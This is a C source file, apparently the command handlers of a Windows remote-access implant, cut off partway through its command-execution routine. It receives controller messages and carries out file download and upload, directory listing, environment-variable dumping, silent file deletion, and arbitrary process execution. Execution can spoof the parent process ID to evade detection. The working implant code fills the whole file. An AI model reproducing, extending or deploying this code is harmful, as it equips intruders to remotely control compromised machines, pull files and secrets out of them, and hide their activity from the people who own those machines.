#include "pch.h"

PENVELOPE DownloadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElement[2];
	PPBElement pRespElement[2];
	PPBElement pFinalElement = NULL;
	LPVOID* UnmarshaledData = NULL;
	LPSTR lpPath = NULL;
	DWORD i = 0;
	PBUFFER pData = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpZipPath = NULL;
	BOOL IsDirectory = FALSE;
	BOOL Compress = FALSE;

	for (i = 0; i < _countof(RecvElement); i++) {
		RecvElement[i] = ALLOC(sizeof(PBElement));
		RecvElement[i]->dwFieldIdx = i + 1;
	}

	RecvElement[0]->Type = Bytes;
	RecvElement[1]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(RecvElement, _countof(RecvElement), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(((PBUFFER*)UnmarshaledData)[0]->pBuffer, 0);
	Compress = (BOOL)UnmarshaledData[1];
	lpTempStr = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpTempStr)) {
		LogError(L"%s is not exist", lpTempStr);
		goto CLEANUP;
	}

	if (IsFolderExist(lpTempStr)) {
		IsDirectory = TRUE;
	}

	lpZipPath = GenerateTempPathW(NULL, L".tar", NULL);
	pData = ALLOC(sizeof(BUFFER));
	if (IsDirectory || Compress) {
		CompressPathByGzip(lpTempStr, lpZipPath);
		if (!IsFileExist(lpZipPath)) {
			goto CLEANUP;
		}

		pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
		DeleteFileW(lpZipPath);
	}
	else {
		pData->pBuffer = ReadFromFile(lpTempStr, &pData->cbBuffer);
	}

	if (pData->pBuffer == NULL || pData->cbBuffer == 0) {
		goto CLEANUP;
	}

	pRespElement[0] = CreateBytesElement(pData->pBuffer, pData->cbBuffer, 1);
	pRespElement[1] = CreateVarIntElement(IsDirectory, 2);

	pFinalElement = CreateStructElement(pRespElement, _countof(pRespElement), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElement); i++) {
		FREE(RecvElement[i]);
	}

	FREE(lpPath);
	FREE(lpTempStr);
	FREE(lpZipPath);
	FreeElement(pFinalElement);
	FreeBuffer(pData);

	return pResult;
}

BOOL LsHandlerCallback
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{
	PFILE_INFO* pFirstFileInfo = (PFILE_INFO*)lpArgs;
	PFILE_INFO pCurrentFileInfo = NULL;
	PFILETIME pModifiedTime = NULL;
	LPSTR lpTemp = NULL;

	if (pFirstFileInfo[0]->dwIdx >= pFirstFileInfo[0]->dwMaxCount) {
		return TRUE;
	}

	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
	if (IsFolderExist(lpPath)) {
		pCurrentFileInfo->IsDir = TRUE;
	}
	else {
		pCurrentFileInfo->uFileSize = GetFileSizeByPath(lpPath);
	}

	lpTemp = ConvertWcharToChar(lpPath);
	pCurrentFileInfo->lpName = GetNameFromPathA(lpTemp);
	FREE(lpTemp);
	pCurrentFileInfo->lpOwner = GetFileOwner(lpPath);
	pModifiedTime = GetModifiedTime(lpPath);
	if (pModifiedTime != NULL) {
		pCurrentFileInfo->uModifiedTime = (UINT)((*((LONGLONG*)pModifiedTime) - 116444736000000000) / 10000000);
		FREE(pModifiedTime);
	}

	if (!pCurrentFileInfo->IsDir && IsStrEndsWithW(lpPath, L".lnk")) {
		lpTemp = GetTargetShortcutFile(lpPath);
		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
	}
	else {
		lpTemp = GetSymbolLinkTargetPath(lpPath);
		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
	}

	return FALSE;
}

VOID FreeFileInfo
(
	_In_ PFILE_INFO pFileInfo
)
{
	if (pFileInfo != NULL) {
		FREE(pFileInfo->lpName);
		FREE(pFileInfo->lpOwner);
		FREE(pFileInfo->lpLinkPath);
		FREE(pFileInfo);
	}
}

PENVELOPE LsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PPBElement FileInfoElement[8];
	PPBElement LsElement[5];
	PPBElement pFinalElement = NULL;
	PPBElement* pElementList = NULL;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpFullPath = NULL;
	LPWSTR lpConvertedPath = NULL;
	PENVELOPE pResult = NULL;
	DWORD dwNumberOfItems = 0;
	PFILE_INFO* FileList = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD dwReturnedLength = 0;
	CHAR szTimeZone[0x10];
	TIME_ZONE_INFORMATION TimeZoneInfo;
	INT TimeBias = 0;

	SecureZeroMemory(LsElement, sizeof(LsElement));
	SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshaledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpFullPath = GetFullPathA(lpPath);
	lpConvertedPath = ConvertCharToWchar(lpFullPath);
	if (!IsPathExist(lpConvertedPath)) {
		LogError(L"%s is not exist\n", lpConvertedPath);
		goto CLEANUP;
	}

	SecureZeroMemory(&TimeZoneInfo, sizeof(TimeZoneInfo));
	GetTimeZoneInformation(&TimeZoneInfo);
	wsprintfA(szTimeZone, "%03d", TimeZoneInfo.Bias / (-60));
	if (TimeZoneInfo.Bias <= 0) {
		szTimeZone[0] = '+';
	}
	else {
		szTimeZone[0] = '-';
	}

	if (TimeZoneInfo.Bias < 0) {
		TimeBias = -(TimeZoneInfo.Bias * 60);
	}
	else {
		TimeBias = TimeZoneInfo.Bias * 60;
	}

	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
	LsElement[1] = CreateVarIntElement(TRUE, 2);
	if (IsFileExist(lpConvertedPath)) {
		FileList = ALLOC(sizeof(PFILE_INFO));
		FileList[0] = ALLOC(sizeof(FILE_INFO));
		dwNumberOfItems = 1;
		FileList[0]->dwMaxCount = dwNumberOfItems;
		LsHandlerCallback(lpConvertedPath, FileList);

		FileInfoElement[0] = CreateBytesElement(FileList[0]->lpName, lstrlenA(FileList[i]->lpName), 1);
		FileInfoElement[1] = CreateVarIntElement(FileList[0]->IsDir, 2);
		FileInfoElement[2] = CreateVarIntElement(FileList[0]->uFileSize, 3);
		FileInfoElement[3] = CreateVarIntElement(FileList[0]->uModifiedTime, 4);
		FileInfoElement[5] = CreateBytesElement(FileList[0]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
		FileInfoElement[6] = CreateBytesElement(FileList[0]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);

		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
		pElementList[0] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
	}
	else if (IsFolderExist(lpConvertedPath)) {
		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
		FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
		for (i = 0; i < dwNumberOfItems; i++) {
			FileList[i] = ALLOC(sizeof(FILE_INFO));
		}

		FileList[0]->dwMaxCount = dwNumberOfItems;
		ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
		dwNumberOfItems = FileList[0]->dwIdx;
		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
		for (i = 0; i < dwNumberOfItems; i++) {
			SecureZeroMemory(FileInfoElement, sizeof(FileInfoElement));
			FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
			FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
			FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
			FileInfoElement[3] = CreateVarIntElement(FileList[i]->uModifiedTime, 4);
			FileInfoElement[5] = CreateBytesElement(FileList[i]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
			FileInfoElement[6] = CreateBytesElement(FileList[i]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);

			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
		}
	}

	if (pElementList != NULL && dwNumberOfItems > 0) {
		LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
	}

	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
	LsElement[4] = CreateVarIntElement(TimeBias, 5);
	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		FreeBuffer(UnmarshaledData[0]);
		FREE(UnmarshaledData);
	}

	FREE(lpPath);
	FREE(pElementList);
	FREE(lpConvertedPath);
	if (FileList != NULL) {
		for (i = 0; i < dwNumberOfItems; i++) {
			FreeFileInfo(FileList[i]);
		}

		FREE(FileList);
	}

	FREE(lpFullPath);
	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE PingHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PUINT64 UnmarshaledData = NULL;
	PENVELOPE pResult = NULL;
	DWORD dwReturnedLength = 0;
	UINT64 uNonce = 0;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Varint;
	pRecvElement->dwFieldIdx = 1;
	UnmarshaledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	uNonce = UnmarshaledData[0];

	pFinalElement = CreateVarIntElement(uNonce, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	pFinalElement->cbMarshaledData = 0;

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE UploadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[4];
	LPVOID* UnmarshaledData = NULL;
	LPSTR lpPath = NULL;
	DWORD i = 0;
	PBUFFER pData = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpZipPath = NULL;
	BOOL IsDirectory = FALSE;
	LPSTR lpFileName = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	RecvElementList[3]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(((PBUFFER*)UnmarshaledData)[0]->pBuffer, 0);
	lpTempStr = ConvertCharToWchar(lpPath);
	if (!IsFolderExist(lpTempStr)) {
		LogError(L"Folder %s is not exist", lpTempStr);
		goto CLEANUP;
	}

	if (UnmarshaledData[2] != NULL) {
		lpFileName = DuplicateStrA(((PBUFFER*)UnmarshaledData)[2]->pBuffer, 0);
	}

	pData = ((PBUFFER*)UnmarshaledData)[1];
	if (pData == NULL) {
		goto CLEANUP;
	}

	UnmarshaledData[1] = NULL;
	IsDirectory = (BOOL)UnmarshaledData[3];
	if (IsDirectory) {
		lpZipPath = GenerateTempPathW(NULL, L".tar", NULL);
		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
			goto CLEANUP;
		}

		Unzip(lpZipPath, lpTempStr);
		DeleteFileW(lpZipPath);
	}
	else {
		if (lpPath[lstrlenA(lpPath) - 1] != '\\') {
			lpPath = StrCatExA(lpPath, "\\");
		}

		lpPath = StrCatExA(lpPath, lpFileName);
		if (!WriteToFileA(lpPath, pData->pBuffer, pData->cbBuffer)) {
			goto CLEANUP;
		}
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[0]);
		FreeBuffer((PBUFFER)UnmarshaledData[1]);
		FreeBuffer((PBUFFER)UnmarshaledData[2]);

		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FREE(RecvElementList[i]);
	}

	FREE(lpPath);
	FREE(lpTempStr);
	FREE(lpZipPath);
	FREE(lpFileName);
	FreeBuffer(pData);

	return pResult;
}

PENVELOPE GetEnvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement* pElementList = NULL;
	PPBElement ElementList2[2];
	PPBElement pElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList = 0x100;
	PBUFFER* pTemp = NULL;
	PENVELOPE pResult = NULL;
	LPWSTR lpEnvList = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	LPWSTR lpTemp = NULL;
	DWORD cEnvList = 0;
	DWORD cbValue = 0;
	DWORD dwNeededSize = 0;

	SecureZeroMemory(ElementList2, sizeof(ElementList2));
	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pElementList = ALLOC(cElementList * sizeof(PBElement));
	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL) {
		lpEnvList = GetEnvironmentStringsW();
		while (TRUE) {
			if (lpEnvList[0] != L'=') {
				break;
			}

			lpEnvList += lstrlenW(lpEnvList) + 1;
		}

		lpTemp = lpEnvList;
		while (TRUE) {
			if (lpTemp[0] == L'\0') {
				break;
			}

			lpKey = ConvertWcharToChar(lpTemp);
			lpTemp += lstrlenW(lpTemp) + 1;
			lpValue = StrChrA(lpKey, '=');
			lpValue[0] = '\0';
			lpValue++;
			if (cEnvList >= cElementList) {
				cElementList = 2 * cEnvList;
				pElementList = REALLOC(pElementList, cElementList * sizeof(PBElement));
			}

			ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
			ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
			FREE(lpKey);
			pElementList[cEnvList++] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		}

		pFinalElement = CreateRepeatedStructElement(pElementList, cEnvList, 1);
	}
	else {
		lpKey = pTemp[0]->pBuffer;
		cbValue = 0x400;
		lpValue = ALLOC(cbValue);
		dwNeededSize = GetEnvironmentVariableA(lpKey, lpValue, cbValue);
		if (lstrlenA(lpValue) == 0) {
			lpValue = REALLOC(lpValue, dwNeededSize + 1);
			GetEnvironmentVariableA(lpKey, lpValue, dwNeededSize + 1);
		}

		ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
		ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
		pElementList[0] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		pFinalElement = CreateRepeatedStructElement(pElementList, 1, 1);
		FREE(lpValue);
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FreeElement(pFinalElement);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpEnvList != NULL) {
		FreeEnvironmentStringsW(lpEnvList);
	}

	FreeElement(pElement);
	FREE(pElementList);

	return pResult;
}

PENVELOPE CdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pResult = NULL;
	LPSTR lpNewPath = NULL;
	DWORD dwReturnedLength = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL || pTemp[0] == NULL) {
		goto CLEANUP;
	}

	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
		lstrcatA(lpNewPath, "\\");
	}

	if (!SetCurrentDirectoryA(lpNewPath)) {
		LOG_ERROR("SetCurrentDirectoryA", GetLastError());
		goto CLEANUP;
	}
	
	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
	pElement->pMarshaledData = NULL;
CLEANUP:
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	FREE(lpNewPath);
	FREE(lpRespData);
	FreeElement(pElement);

	return pResult;
}

PENVELOPE PwdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwReturnedLength = 0;
	PENVELOPE pResult = NULL;

	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
	pElement->pMarshaledData = NULL;
CLEANUP:
	FREE(lpRespData);
	FreeElement(pElement);

	return pResult;
}

PENVELOPE RmHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[3];
	PPBElement RespElement;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	BOOL Force = FALSE;
	BOOL Recursive = FALSE;
	LPWSTR lpConvertedPath = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Varint;
	Element[2]->Type = Varint;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpConvertedPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (pTemp[1] != 0) {
		Recursive = TRUE;
	}

	if (pTemp[2] != 0) {
		Force = TRUE;
	}

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_DELETE;
	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
	RespElement->pMarshaledData = NULL;
CLEANUP:
	FREE(ShFileStruct.pFrom);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	FREE(lpConvertedPath);
	FREE(lpRespData);
	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);
	return pResult;
}

PENVELOPE MkdirHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	PENVELOPE pResult = NULL;
	DWORD dwReturnedLength = 0;
	LPWSTR lpPath = NULL;
	DWORD dwErrorCode = ERROR_SUCCESS;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (lpPath[lstrlenW(lpPath) - 1] == L'\\') {
		lpPath[lstrlenW(lpPath) - 1] = L'\0';
	}

	dwErrorCode = SHCreateDirectory(NULL, lpPath);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHCreateDirectory", dwErrorCode);
		goto CLEANUP;
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
	pElement->pMarshaledData = NULL;
CLEANUP:
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	FREE(lpPath);
	FreeElement(pElement);
	return pResult;
}

PENVELOPE ExecuteHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[6];
	PPBElement RespElementList[4];
	PPBElement pFinalElement = NULL;
	LPVOID* UnmarshaledData = NULL;
	LPSTR lpStdOutPath = NULL;
	LPSTR lpStdErrPath = NULL;
	DWORD i = 0;
	DWORD dwArgc = 0;
	BOOL Output = FALSE;
	DWORD dwParentPid = 0;
	LPSTR lpCommandLine = NULL;
	STARTUPINFOEXA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	DWORD cbAttributes = 0;
	HANDLE hParentProcess = NULL;
	HANDLE hStdOut = INVALID_HANDLE_VALUE;
	HANDLE hStdErr = INVALID_HANDLE_VALUE;
	DWORD dwExitCode = 0;
	PBYTE pOutputBuffer = NULL;
	DWORD cbOutputBuffer = 0;
	PBYTE pErrorBuffer = NULL;
	DWORD cbErrorBuffer = 0;
	LPWSTR lpTempPath = NULL;
	SECURITY_ATTRIBUTES SecurityAttributes;

	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
	SecureZeroMemory(RespElementList, sizeof(RespElementList));
	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
	}

	RecvElementList[5]->dwFieldIdx = 10;
	RecvElementList[0]->Type = Bytes;
	RecvElementList[1]->Type = RepeatedBytes;
	RecvElementList[2]->Type = Varint;
	RecvElementList[3]->Type = Bytes;
	RecvElementList[4]->Type = Bytes;
	RecvElementList[5]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL && UnmarshaledData[0] != NULL) {
		goto CLEANUP;
	}

	lpCommandLine = DuplicateStrA(((PBUFFER)(UnmarshaledData[0]))->pBuffer, 1);
	if (UnmarshaledData[3] != NULL) {
		lpStdOutPath = DuplicateStrA(((PBUFFER)(UnmarshaledData[3]))->pBuffer, 0);
	}

	if (UnmarshaledData[4] != NULL) {
		lpStdErrPath = DuplicateStrA(((PBUFFER)(UnmarshaledData[4]))->pBuffer, 0);
	}

	if (lpStdOutPath != NULL && lpStdErrPath != NULL && !lstrcmpA(lpStdErrPath, lpStdOutPath)) {
		goto CLEANUP;
	}

	if (UnmarshaledData[1] != NULL) {
		lstrcatA(lpCommandLine, " ");
		dwArgc = *(PDWORD)(UnmarshaledData[1]);
		for (i = 0; i < dwArgc; i++) {
			lpCommandLine = StrCatExA(lpCommandLine, ((PBUFFER*)(UnmarshaledData[1]))[i + 1]->pBuffer);
			lpCommandLine = StrCatExA(lpCommandLine, " ");
		}
	}

	Output = (BOOL)UnmarshaledData[2];
	dwParentPid = (DWORD)UnmarshaledData[5];
	if (dwParentPid > 0) {
		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
		if (hParentProcess == NULL) {
			LOG_ERROR("OpenProcess", GetLastError());
			goto CLEANUP;
		}

		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributes);
		StartupInfo.lpAttributeList = ALLOC(cbAttributes);
		UpdateProcThreadAttribute(StartupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess), NULL, NULL);
	}

	if (Output) {
		if (lpStdOutPath == NULL) {
			lpStdOutPath = GenerateTempPathA(NULL, ".txt", NULL);
		}

		if (lpStdErrPath == NULL) {
			lpStdErrPath = GenerateTempPathA(NULL, ".txt", NULL);
		}

		SecureZeroMemory(&SecurityAttributes, sizeof(SecurityAttributes));
		SecurityAttributes.nLength = sizeof(SecurityAttributes);
		SecurityAttributes.lpSecurityDescriptor = NULL;
		SecurityAttributes.bInheritHandle = TRUE;
		StartupInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

		hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hStdOut == INVALID_HANDLE_VALUE) {
			LOG_ERROR("CreateFileA", GetLastError());
			goto CLEANUP;
		}

		StartupInfo.StartupInfo.hStdOutput = hStdOut;
		hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hStdErr == INVALID_HANDLE_VALUE) {
			LOG_ERROR("CreateFileA", GetLastError());
			goto CLEANUP;
		}

		StartupInfo.StartupInfo.hStdError = hStdErr;
	}

	StartupInfo.StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessA(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		LOG_ERROR("CreateProcessA", GetLastError());
		goto CLEANUP;
	}

	RespElementList[3] = CreateVarIntElement(GetProcessId(ProcessInfo.hProcess), 4);
	if (Output) {
		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
		CloseHandle(hStdOut);
		hStdOut = INVALID_HANDLE_VALUE;
		lpTempPath = ConvertCharToWchar(lpStdOutPath);
		pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
		RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
		FREE(lpTempPath);

		if (UnmarshaledData[3] == NULL) {
			DeleteFileA(lpStdOutPath);
		}

		CloseHandle(hStdErr);
		hStdErr = INVALID_HANDLE_VALUE;
		lpTempPath = ConvertCharToWchar(lpStdErrPath);
		pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
		RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
		FREE(lpTempPath);
		if (UnmarshaledData[4] == NULL) {
			DeleteFileA(lpStdErrPath);
		}

		GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode);
		RespElementList[0] = CreateVarIntElement(dwExitCode, 1);
	}

	pFinalElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (ProcessInfo.hThread != NULL) {
		CloseHandle(ProcessInfo.hThread);
	}

	if (ProcessInfo.hProcess != NULL) {
		CloseHandle(ProcessInfo.hProcess);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[0]);
		FreeBuffer((PBUFFER)UnmarshaledData[3]);
